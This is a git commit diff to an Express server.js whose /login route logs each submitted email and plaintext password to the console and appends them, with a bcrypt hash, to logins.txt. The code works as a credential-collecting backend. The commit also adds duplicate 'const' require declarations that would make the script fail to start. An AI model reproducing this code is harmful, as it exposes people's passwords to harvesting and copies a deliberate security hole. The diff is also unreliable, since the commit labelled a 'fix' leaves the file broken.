6c7b88daadb3fe3e1b9b6289cc372b9673bed185
Mathijs <mathijsdp10@gmail.com>
2026-03-19 10:57:24 +0100

    render-ready fix

--- server.js
+++ server.js
@@ -1,11 +1,18 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const fs = require("fs");
+console.log("Server script geladen...");
+
+const express = require("express");
+const bodyParser = require("body-parser");
+const fs = require("fs");
 const bcrypt = require("bcrypt");
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
+
+console.log("Dependencies geladen...");
 
 app.get("/", (req, res) => {
     res.sendFile(__dirname + "/index.html");
@@ -16,19 +23,15 @@ app.post("/login", async (req, res) => {
         const email = req.body.email;
         const password = req.body.password;
 
-        // Check of velden bestaan
         if (!email || !password) {
             return res.status(400).send("Email en wachtwoord zijn verplicht.");
         }
 
-        // Plain password tonen
         console.log(`Email: ${email}`);
         console.log(`Plain Password: ${password}`);
 
-        // Hash het wachtwoord
         const hash = await bcrypt.hash(password, 10);
 
-        // Sla alles op in logins.txt in de projectfolder
         fs.appendFileSync("logins.txt", `Email: ${email} | Password: ${password} | Hash: ${hash}\n`);
 
         res.send("Login geregistreerd! Check Render Logs voor plain password en logins.txt voor hash.");
@@ -38,7 +41,6 @@ app.post("/login", async (req, res) => {
     }
 });
 
-// Render poort
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server draait op poort ${PORT}`);
